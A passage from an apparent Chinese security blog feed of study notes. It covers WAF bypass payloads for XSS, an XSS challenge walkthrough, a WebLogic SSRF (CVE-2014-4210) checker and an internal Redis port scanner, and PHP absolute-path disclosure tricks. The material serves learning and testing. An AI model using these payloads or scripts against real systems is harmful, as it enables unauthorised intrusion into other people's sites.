class="number">0x28</span>,<span class="number">0x2C</span>,<span class="number">0x3B</span>]</span><br><span class="line">x0b在Mod_security中已经被过滤，绕过的方法：</span><br><span class="line">&lt;a/onmouseover[\x0b]=location=&amp;#039;\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x30\x29\x3B&amp;#039;&gt;rhainfosec</span><br></pre></td></tr></table></figure><p><strong>缺少X-frame选项</strong></p><p>通常会认为X-frame是用来防护点击劫持的配置，其实也可以防护使用iframe引用的xss漏洞</p><p><strong>Docmodes</strong></p><p>IE引入了doc-mode很长时间，提供给老版本浏览器的后端兼容性，有风险，攻击情景是黑客可以引用你站点的框架，他可以引入doc-mode执行css表达式</p><p>expression(open(alert(1)))</p><p>以下POC可以插入到IE7中</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"X-UA-Compatible"</span> content=<span class="string">"IE=EmulateIE7"</span> /&gt;</span><br><span class="line">&lt;iframesrc=<span class="string">"https://targetwebsite.com"</span>&gt;</span><br><span class="line">&lt;<span class="regexp">/body&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>html&gt;</span><br></pre></td></tr></table></figure><p><strong>Window.name欺骗</strong></p><p>情景：我们用iframe加载一个页面，我们可以控制窗口的名称，这里也可以执行javascript代码</p><p>POC</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">    &lt;iframesrc=&amp;#039;http://www.target.com?foo="xss  autofocus/AAAAA  onfocus=location=window.name//&amp;#039;</span><br><span class="line">name=<span class="string">"javascript:alert("</span>XSS<span class="string">")"</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p><strong>DOM型XSS</strong></p><p>服务器不支持过滤DOM型的XSS，因为DOM型XSS总是在客户端执行，看一个例子：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">vari=location.hash;</span><br><span class="line"><span class="built_in">document</span>.write(i);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>在一些情况下，反射型XSS可以转换成DOM型XSS：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//www.target.com/xss.php?foo=&lt;svg/onload=location=/java/.source+/script/.source+location.hash[1]+/al/.source+/ert/.source+location.hash[2]+/docu/.source+/ment.domain/.source+location.hash[3]//#:()</span></span><br></pre></td></tr></table></figure><p>上面的POC只在[.+都被允许的情况下适用，可以使用location.hash注入任何不允许的编码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Location.hash[<span class="number">1</span>] = :  <span class="comment">// Defined at the first position after     the hash.</span></span><br><span class="line">Location.hash[<span class="number">2</span>]= (  <span class="comment">// Defined at the second position after     the has</span></span><br><span class="line">Location.hash[<span class="number">3</span>] = ) <span class="comment">// Defined     at third position after the hash.</span></span><br></pre></td></tr></table></figure><p>如果有客户端过滤可能不适用</p><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p><strong>ModSecurity绕过</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;scri%<span class="number">00</span>pt&gt;confirm(<span class="number">0</span>);&lt;/scri%00pt&gt;</span><br><span class="line">&lt;a/onmouseover[\x0b]=location=&amp;#039;\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x30\x29\x3B&amp;#039;&gt;rhainfosec</span><br></pre></td></tr></table></figure><p>参考<a href="http://blog.spiderlabs.com/2013/09/modsecurity-xss-evasion-challenge-results.html" target="_blank" rel="noopener">http://blog.spiderlabs.com/2013/09/modsecurity-xss-evasion-challenge-results.html</a></p><p><strong>WEB KNIGHT绕过</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;isindex action=j&amp;Tab;a&amp;Tab;vas&amp;Tab;c&amp;Tab;r&amp;Tab;ipt:alert(<span class="number">1</span>) type=image&gt;</span><br><span class="line">&lt;marquee/onstart=confirm(<span class="number">2</span>)&gt;</span><br></pre></td></tr></table></figure><p><strong>F5 BIG IP ASM and Palo ALTO绕过</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;table background=<span class="string">"javascript:alert(1)"</span>&gt;&lt;/table&gt; <span class="comment">//IE6或者低版本Opera</span></span><br><span class="line">“/&gt;&lt;marquee  onfinish=confirm(123)&gt;a&lt;/marquee&gt;</span><br></pre></td></tr></table></figure><p><strong>Dot Defender绕过</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=prompt(<span class="number">1</span>);&gt; </span><br><span class="line">&lt;isindex action=<span class="string">"javas&amp;tab;cript:alert(1)"</span> type=image&gt;</span><br><span class="line">&lt;marquee/onstart=confirm(<span class="number">2</span>)&gt;</span><br></pre></td></tr></table></figure><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>黑名单方式永远不是最好的解决办法，但是相对与白名单效率很高，对于WAF供应商来说，最好的实践如下：</p><p>1、开发者和管理员要注意WAF只能缓解攻击，并且针对已知的弱点的防护只是和源代码修复的方法打个时间差；</p><p>2、要保持WAF的规则库更新；</p><p>3、WAF可以配置参数限制，需要提供手册用于配置参数content-length最大最小长度，content-type类型，在入侵时进行告警；</p><p>4、如果WAF依据黑名单，要确保可以阻断已知的浏览器BUG，并且相应规则库要及时更新。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://zdresearch.com/zdresearch-xss1-challenge-writeup/" target="_blank" rel="noopener">https://zdresearch.com/zdresearch-xss1-challenge-writeup/</a></p><p><a href="http://blog.spiderlabs.com/2013/09/modsecurity-xss-evasion-challenge-results.html" target="_blank" rel="noopener">http://blog.spiderlabs.com/2013/09/modsecurity-xss-evasion-challenge-results.html</a></p><p><a href="http://html5sec.org/" target="_blank" rel="noopener">http://html5sec.org</a></p><p><a href="https://cure53.de/xfo-clickjacking.pdf" target="_blank" rel="noopener">https://cure53.de/xfo-clickjacking.pdf</a></p><p><a href="http://resources.infosecinstitute.com/demystifying-html-5-attacks/" target="_blank" rel="noopener">http://resources.infosecinstitute.com/demystifying-html-5-attacks/</a></p><p><strong>来源：</strong>Modern Web Application Firewalls Fingerprinting and Bypassing XSS Filters</p><p><strong>原作者：</strong>RAFAY BALOCH,TANZIL JAFFERY</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;XSS现代WAF规则探测及绕过技术&quot;&gt;&lt;a href=&quot;#XSS现代WAF规则探测及绕过技术&quot; class=&quot;headerlink&quot; title=&quot;XSS现代WAF规则探测及绕过技术&quot;&gt;&lt;/a&gt;XSS现代WAF规则探测及绕过技术&lt;/h2&gt;&lt;h2 id=&quot;初始测试&quot;&gt;&lt;a href=&quot;#初始测试&quot; class=&quot;headerlink&quot; title=&quot;初始测试&quot;&gt;&lt;/a&gt;&lt;strong&gt;初始测试&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;1、使用无害的payload，类似&lt;b&gt;,&lt;i&gt;,&lt;u&gt;观察响应，判断应用程序是否被HTML编码，是否标签被过滤，是否过滤&amp;lt;&amp;gt;等等；&lt;/u&gt;&lt;/i&gt;&lt;/b&gt;&lt;/p&gt;
&lt;p&gt;2、如果过滤闭合标签，尝试无闭合标签的payload（&amp;lt;b,&amp;lt;i,&amp;lt;marquee）观察响应；&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>XSS游戏学习总结备忘录</title>
    <link href="http://www.7wawa.com/2019/01/08/XSS%E6%B8%B8%E6%88%8F%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    <id>http://www.7wawa.com/2019/01/08/XSS%E6%B8%B8%E6%88%8F%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%E5%A4%87%E5%BF%98%E5%BD%95/</id>
    <published>2019-01-08T09:20:56.000Z</published>
    <updated>2019-01-09T07:13:55.186Z</updated>
    
    <content type="html"><![CDATA[<p>没有任何过滤的情况：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;confirm(<span class="string">"完成的不错！"</span>)&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;script&gt;alert(1)&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure><a id="more"></a><p>使用”   &gt;来闭合标签</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test<span class="string">"&gt;&lt;script&gt;confirm("</span>完成的不错！<span class="string">")&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p>过滤了尖括号，用事件来弹窗</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">' oninput=alert`1` //</span></span><br><span class="line"><span class="string">'</span> oninput=alert<span class="string">`1`</span> <span class="string">'</span></span><br><span class="line"><span class="string">'</span> onchange=alert<span class="string">`1`</span> <span class="comment">//</span></span><br><span class="line"><span class="string">' onchange=alert`1` '</span></span><br><span class="line"><span class="string">" onchange=alert`1` "</span></span><br><span class="line"><span class="string">" onchange=alert`1` //</span></span><br><span class="line"><span class="string">"</span> oninput=alert<span class="string">`1`</span> <span class="string">"</span></span><br><span class="line"><span class="string">"</span> oninput=alert<span class="string">`1`</span> <span class="comment">//</span></span><br></pre></td></tr></table></figure><p>过滤了 on和script的情况</p><p>使用伪协议和html实体编码来绕过（也可以尝试大小写绕过）</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">"&gt; &lt;a href="java&amp;#x0073;cript:%61lert(1)"&gt;click me&lt;/a&gt; //</span><br><span class="line">"&gt; &lt;a href="java&amp;#x0073;cript:alert('xss')"&gt;111&lt;/a&gt; //</span><br><span class="line">"&gt; &lt;a href="java&amp;#x0073;cript:alert(/1/)"&gt;axxx&lt;/a&gt; //</span><br></pre></td></tr></table></figure><p>标签大小写绕过：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt; &lt;Script&gt;alert('handsome boy')&lt;/script&gt; //</span></span><br><span class="line"><span class="string">"</span>&gt; &lt;img Src=x OnError=alert('xss')&gt; //</span><br></pre></td></tr></table></figure><p>来到第七关，这一关是针对script和on的过滤，我们可以构造来绕过</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">" oonninput=alert(1) "</span></span><br><span class="line"><span class="string">"&gt; &lt;scscriptript&gt;alert`xss`&lt;/scscriptript&gt; //</span></span><br></pre></td></tr></table></figure><p>没有过滤：<code>&#39; &gt; &lt; % &amp; #</code></p><p>过滤了：<code>&quot; src on script data</code></p><p>a标签内，href属性中，很明显，我们想到了协议绕过</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Javascript：伪协议后面可以使用URL编码。</span><br><span class="line">        如：&lt;a href="javascript:<span class="comment">%61lert(1)"&gt;click me&lt;/a&gt;可成功执行弹窗。</span></span><br><span class="line">        可用img就不行:&lt;img src=1 onerror="javascript:<span class="comment">%61lert(1)"&gt;</span></span><br><span class="line">        因为href属性会跳转到其中的URL，而会进行URL解码，onerror属性只会执行JS,不跳转同时后面的url编码可以再做一次entity(HTML实体)编码：</span><br><span class="line">        &lt;a href="javascript:<span class="comment">%61lert(1)"&gt;click me&lt;/a&gt;</span></span><br></pre></td></tr></table></figure><p>本题目难点在于它会自动检测url，如果发现没有带http:// 内容则会显示不合法，那么应该如何绕过呢？</p><p>href必须带着url!</p><p>%0d  %0a都是换行符</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(<span class="number">1</span>)<span class="comment">//http://www.0aa.me  //利用注释</span></span><br><span class="line">javascript:%<span class="number">0</span>dhttp:<span class="comment">//www.0aa.me%0dalert(1)  //不能用注释的情况下</span></span><br></pre></td></tr></table></figure><p>针对题目，我们可以适当修改一下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(<span class="number">1</span>)<span class="comment">//http://www.0aa.me</span></span><br><span class="line">javascript:%<span class="number">0</span>dhttp:<span class="comment">//www.0aa.me%0dalert(1)  //</span></span><br></pre></td></tr></table></figure><p>AngularJS ng-include 指令</p><p>ng-include 指令用于包含外部的 HTML 文件。</p><p>包含的内容将作为指定元素的子节点。</p><p>ng-include 属性的值可以是一个表达式，返回一个文件名。</p><p>默认情况下，包含的文件需要包含在同一个域名下。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;element ng-include=<span class="string">"filename"</span> onload=<span class="string">"expression"</span> autoscroll=<span class="string">"expression"</span> &gt;&lt;/element&gt;</span><br><span class="line">​</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">~~~javascript</span><br></pre></td></tr></table></figure><p><body><span class="ng-include:'level1.php?name=test<img src=1 onerror=alert(1)>'"></span></body><br>~~~</p><p>过滤空格，script，/，使用%0d %0a做分割符</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/level16.php?keyword=&lt;img%0Dsrc=1%0Donerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;没有任何过滤的情况：&lt;/p&gt;
&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;script&amp;gt;confirm(&lt;span class=&quot;string&quot;&gt;&quot;完成的不错！&quot;&lt;/span&gt;)&amp;lt;&lt;span class=&quot;regexp&quot;&gt;/script&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;regexp&quot;&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/&lt;/span&gt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>weblogic ssrf 漏洞笔记</title>
    <link href="http://www.7wawa.com/2019/01/08/weblogic-ssrf-%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"/>
    <id>http://www.7wawa.com/2019/01/08/weblogic-ssrf-%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/</id>
    <published>2019-01-08T07:13:42.000Z</published>
    <updated>2019-01-09T07:13:28.209Z</updated>
    
    <content type="html"><![CDATA[<h1 id="weblogic-ssrf-漏洞笔记"><a href="#weblogic-ssrf-漏洞笔记" class="headerlink" title="[weblogic ssrf 漏洞笔记]"></a>[weblogic ssrf 漏洞笔记]</h1><p><strong>CVE-2014-4210</strong></p><p>　　Oracle WebLogic web server即可以被外部主机访问，同时也允许访问内部主机。比如有一个jsp页面SearchPublicReqistries.jsp，我们可以利用它进行攻击，未经授权通过weblogic server连接任意主机的任意TCP 端口，可以能冗长的响应来推断在此端口上是否有服务在监听此端口。（ps:本人觉得挺鸡肋的，要是目标机没开redis的6379端口没法getshll了。当然也是自己太菜）</p><a id="more"></a><p><strong>1.weblogic_ssrf.py（仅能用来判断是否有该漏洞）</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">name: weblogic SSRF漏洞(CVE-2014-4210)</span></span><br><span class="line"><span class="string">referer: http://blog.gdssecurity.com/labs/2015/3/30/weblogic-ssrf-and-xss-cve-2014-4241-cve-2014-4210-cve-2014-4.html</span></span><br><span class="line"><span class="string">author: Lucifer</span></span><br><span class="line"><span class="string">description: weblogic 版本10.0.2 -- 10.3.6中SearchPublicRegistries.jsp，参数operator可传入内网IP造成SSRF漏洞</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> termcolor <span class="keyword">import</span> cprint</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">weblogic_ssrf_BaseVerify</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, url)</span>:</span></span><br><span class="line">        self.url = url</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        headers = &#123;</span><br><span class="line">        <span class="string">"User-Agent"</span>:<span class="string">"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"</span></span><br><span class="line">        &#125;</span><br><span class="line">        payload = <span class="string">"/uddiexplorer/SearchPublicRegistries.jsp?operator=http://localhost/robots.txt&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search"</span></span><br><span class="line">        vulnurl = self.url + payload</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            req = requests.get(vulnurl, headers=headers, timeout=<span class="number">10</span>, verify=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">r"weblogic.uddi.client.structures.exception.XML_SoapException"</span> <span class="keyword">in</span> req.text <span class="keyword">and</span> <span class="string">r"IO Exception on sendMessage"</span> <span class="keyword">not</span> <span class="keyword">in</span> req.text:</span><br><span class="line">                cprint(<span class="string">"[+]存在weblogic SSRF漏洞...(中危)\tpayload: "</span>+vulnurl, <span class="string">"yellow"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            cprint(<span class="string">"[-] "</span>+__file__+<span class="string">"====&gt;连接超时"</span>, <span class="string">"cyan"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    warnings.filterwarnings(<span class="string">"ignore"</span>)</span><br><span class="line">    testVuln = weblogic_ssrf_BaseVerify(sys.argv[<span class="number">1</span>])</span><br><span class="line">    testVuln.run()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/01/08/5c34357a4e719.png" alt=""></p><p><strong>2.利用UDDI Explorerc查看内网ip段</strong></p><p>　　如下图可知目标机的内网IP为127.0.0.1</p><p><img src="https://i.loli.net/2019/01/08/5c3435d3aaec3.png" alt=""></p><p><strong>3.利用weblogic_redisscan.py扫描内网是否有6379端口，也就是redis服务</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line">    <span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">     </span><br><span class="line">    <span class="keyword">import</span> httplib</span><br><span class="line">    <span class="keyword">import</span>  time</span><br><span class="line">    <span class="keyword">from</span> colorama <span class="keyword">import</span> init,Fore</span><br><span class="line">    init(autoreset=<span class="keyword">True</span>)</span><br><span class="line">    ips = [<span class="string">'127.0.0.'</span>]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> ips:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">255</span>):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">print</span> Fore.BLUE+<span class="string">'[-]Check '</span>+j+str(i)</span><br><span class="line">                conn = httplib.HTTPSConnection(<span class="string">'xx.bbbb.com'</span>,<span class="number">80</span>,timeout=<span class="number">5</span>)</span><br><span class="line">                conn.request(method=<span class="string">"GET"</span>,url=<span class="string">"/uddiexplorer/SearchPublicRegistries.jsp?operator=http://"</span>+j+str(i)+\</span><br><span class="line">                            <span class="string">":6379&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search"</span>)</span><br><span class="line">                conn.getresponse().read()</span><br><span class="line">                conn.close()</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    conn = httplib.HTTPSConnection(<span class="string">'xx.bbbb.com'</span>,<span class="number">80</span>,timeout=<span class="number">5</span>)</span><br><span class="line">                    conn.request(method=<span class="string">"GET"</span>,url=<span class="string">"/uddiexplorer/SearchPublicRegistries.jsp?operator=https://"</span>+j+str(i)+\</span><br><span class="line">                                <span class="string">":6379&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search"</span>)</span><br><span class="line">                    conn.getresponse().read()</span><br><span class="line">                    conn.close()</span><br><span class="line">                    time.sleep(<span class="number">4</span>)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">print</span> Fore.RED+<span class="string">'[+] '</span>+j+str(i)+<span class="string">':6379 is open'</span></span><br><span class="line">                    time.sleep(<span class="number">4</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                time.sleep(<span class="number">4</span>)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/01/08/5c34361c7bc8b.png" alt=""></p><p>要是你扫了出来，这里有的redis getshell 的教程<a href="http://www.sohu.com/a/210792763_100014967" target="_blank" rel="noopener"> web安全-SSRF实战</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;weblogic-ssrf-漏洞笔记&quot;&gt;&lt;a href=&quot;#weblogic-ssrf-漏洞笔记&quot; class=&quot;headerlink&quot; title=&quot;[weblogic ssrf 漏洞笔记]&quot;&gt;&lt;/a&gt;[weblogic ssrf 漏洞笔记]&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;CVE-2014-4210&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　Oracle WebLogic web server即可以被外部主机访问，同时也允许访问内部主机。比如有一个jsp页面SearchPublicReqistries.jsp，我们可以利用它进行攻击，未经授权通过weblogic server连接任意主机的任意TCP 端口，可以能冗长的响应来推断在此端口上是否有服务在监听此端口。（ps:本人觉得挺鸡肋的，要是目标机没开redis的6379端口没法getshll了。当然也是自己太菜）&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>php爆绝对路径</title>
    <link href="http://www.7wawa.com/2018/12/25/php%E7%88%86%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84/"/>
    <id>http://www.7wawa.com/2018/12/25/php%E7%88%86%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84/</id>
    <published>2018-12-25T03:23:02.000Z</published>
    <updated>2019-01-09T07:15:05.423Z</updated>
    
    <content type="html"><![CDATA[<h1 id="php爆绝对路径方法"><a href="#php爆绝对路径方法" class="headerlink" title="php爆绝对路径方法"></a>php爆绝对路径方法</h1><h3 id="单引号爆路径"><a href="#单引号爆路径" class="headerlink" title="单引号爆路径"></a>单引号爆路径</h3><p>直接在URL后面加单引号，要求单引号没有被过滤(gpc=off)且服务器默认返回错误信息。<br><code>www.xxx.com/news.php?id=1′</code></p><a id="more"></a><h3 id="错误参数值爆路径"><a href="#错误参数值爆路径" class="headerlink" title="错误参数值爆路径"></a>错误参数值爆路径</h3><p>将要提交的参数值改成错误值，比如-1。-99999单引号被过滤时不妨试试。<br><code>www.xxx.com/researcharchive.php?id=-1</code></p><h3 id="Google爆路径"><a href="#Google爆路径" class="headerlink" title="Google爆路径"></a>Google爆路径</h3><p>结合关键字和site语法搜索出错页面的网页快照，常见关键字有warning和fatal error。注意，如果目标站点是二级域名，site接的是其对应的顶级域名，这样得到的信息要多得多。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Site:xxx.edu.tw warning</span><br><span class="line">Site:xxx.com.tw “fatal error”</span><br></pre></td></tr></table></figure><h3 id="测试文件爆路径"><a href="#测试文件爆路径" class="headerlink" title="测试文件爆路径"></a>测试文件爆路径</h3><p>很多网站的根目录下都存在测试文件，脚本代码通常都是phpinfo()。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">www.xxx.com/test.php</span><br><span class="line">www.xxx.com/ceshi.php</span><br><span class="line">www.xxx.com/info.php</span><br><span class="line">www.xxx.com/phpinfo.php</span><br><span class="line">www.xxx.com/php_info.php</span><br><span class="line">www.xxx.com/1.php</span><br></pre></td></tr></table></figure><h3 id="phpmyadmin爆路径"><a href="#phpmyadmin爆路径" class="headerlink" title="phpmyadmin爆路径"></a>phpmyadmin爆路径</h3><p>一旦找到phpmyadmin的管理页面，再访问该目录下的某些特定文件，就很有可能爆出物理路径。至于phpmyadmin的地址可以用wwwscan这类的工具去扫，也可以选择google。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/phpmyadmin/libraries/lect_lang.lib.php</span><br><span class="line">/phpMyAdmin/index.php?lang[]=1</span><br><span class="line">/phpMyAdmin/phpinfo.php</span><br><span class="line">load_file()</span><br><span class="line">/phpmyadmin/themes/darkblue_orange/layout.inc.php</span><br><span class="line">/phpmyadmin/libraries/select_lang.lib.php</span><br><span class="line">/phpmyadmin/libraries/lect_lang.lib.php</span><br><span class="line">/phpmyadmin/libraries/mcrypt.lib.php</span><br></pre></td></tr></table></figure><h3 id="配置文件找路径"><a href="#配置文件找路径" class="headerlink" 